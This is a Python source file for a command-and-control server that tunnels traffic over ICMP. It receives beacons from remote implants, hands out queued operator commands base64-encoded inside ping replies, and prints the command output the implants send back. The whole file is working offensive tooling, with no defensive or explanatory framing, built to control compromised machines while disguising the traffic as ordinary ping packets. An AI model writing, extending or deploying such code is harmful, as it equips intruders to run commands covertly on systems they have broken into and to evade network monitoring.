import socket
import struct
import base64
import queue
import threading
import sys

def checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack("!%dH" % (len(data)//2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
print("[+] ICMP C2 Server listening...")

client_state = {}       # pid -> last_seq
command_queues = {}     # pid -> queue.Queue()
print_lock = threading.Lock()

def safe_print(*args, end="\n"):
    with print_lock:
        print(*args, end=end)
        sys.stdout.flush()

def input_thread_func():
    """Async input thread that adds commands to all client queues."""
    while True:
        cmd = input().strip()
        if not cmd:
            cmd = "NOP"
        for pid in command_queues:
            command_queues[pid].put(cmd)

# Start input thread
threading.Thread(target=input_thread_func, daemon=True).start()

while True:
    packet, addr = sock.recvfrom(2048)

    icmp_type, _, _, pid, seq = struct.unpack("!BBHHH", packet[20:28])
    payload = packet[28:].decode(errors="ignore").strip()

    if icmp_type != 8:
        continue

    # Initialize state for new clients
    if pid not in client_state:
        client_state[pid] = -1
        command_queues[pid] = queue.Queue()

    # Handle client output
    if payload.startswith("OUT:"):
        encoded = payload[4:]
        try:
            decoded = base64.b64decode(encoded).decode(errors="ignore")
        except Exception as e:
            decoded = f"[!] Error decoding output: {e}"
        safe_print(f"\n[+] Output from {addr[0]} (PID {pid}):\n{decoded}")
        safe_print("c2>",end="")
        continue

    # Handle beacon
    if payload.startswith("BEACON"):
        safe_print(f"\n[+] Beacon from {addr[0]} (PID {pid}, Seq {seq})")
        safe_print("c2> ",end="")
        last_seq = client_state.get(pid, -1)
        if seq == last_seq:
            safe_print("[!] Duplicate beacon detected, skipping command send")
            safe_print("c2> ", end="")
            continue
        client_state[pid] = seq

        # Get next command from queue, or NOP
        try:
            cmd = command_queues[pid].get_nowait()
        except queue.Empty:
            cmd = "NOP"

        encoded_cmd = base64.b64encode(cmd.encode()).decode()
        cmd_payload = f"CMD:{encoded_cmd}".encode()

        reply = struct.pack("!BBHHH", 0, 0, 0, pid, seq) + cmd_payload
        chksum = checksum(reply)
        reply = struct.pack("!BBHHH", 0, 0, chksum, pid, seq) + cmd_payload

        sock.sendto(reply, addr)
